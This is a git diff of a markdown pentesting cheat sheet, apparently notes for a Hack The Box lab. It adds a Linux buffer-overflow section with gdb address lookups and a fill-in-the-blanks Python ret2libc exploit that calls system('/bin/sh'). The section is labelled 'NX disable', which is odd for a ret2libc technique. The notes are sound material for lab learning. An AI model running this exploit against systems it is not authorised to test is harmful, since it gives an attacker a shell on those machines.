@@ -407,7 +407,7 @@ export SHELL=bash
 
 # Buffer Overflow
 
-## Linux
+## Linux [s4vitar - HTB October](https://youtu.be/3QZfUBVr-AA?t=4150)
 
 ### Taking the binary to the attacker machine
 
@@ -465,9 +465,56 @@ Run the binary with the offset breakpoint to confirm
 ```
 r $(python -c 'print("A"*offser_breakpoint + "B"*4)')
 ```
-If NX is disable, you can execute commands
+### NX disable
 
-### NX enable:
+Set a breakpoint on the main function
+
+Check the system_addr_off
+```
+p system
+```
+Check the exit_addr_off
+```
+p exit
+```
+Check the bin_sh_addr_off
+```
+find "/bin/sh"
+```
+
+```
+#!/usr/bin/python3
+
+from struct import pack
+from subprocess import call
+
+full_path_to_binary =
+
+offset = 
+
+junk = b"A"*offset
+
+# All varibles must have the same number of characters
+
+base_libc_addr = 
+
+system_addr_off = 
+
+exit_addr_off = 
+
+bin_sh_addr_off = 
+
+system_addr = pack("<L", base_libc_addr + system_addr_off)
+exit_addr = pack("<L", base_libc_addr + exit_addr_off)
+bin_sh_addr = pack("<L", base_libc_addr + bin_sh_addr_off)
+
+
+payload = junk + system_addr + exit_addr + bin_sh_addr
+
+ret = call([full_path_to_binary, payload])
+```
+
+### NX enable
 
 Check the system architecture 
 ```
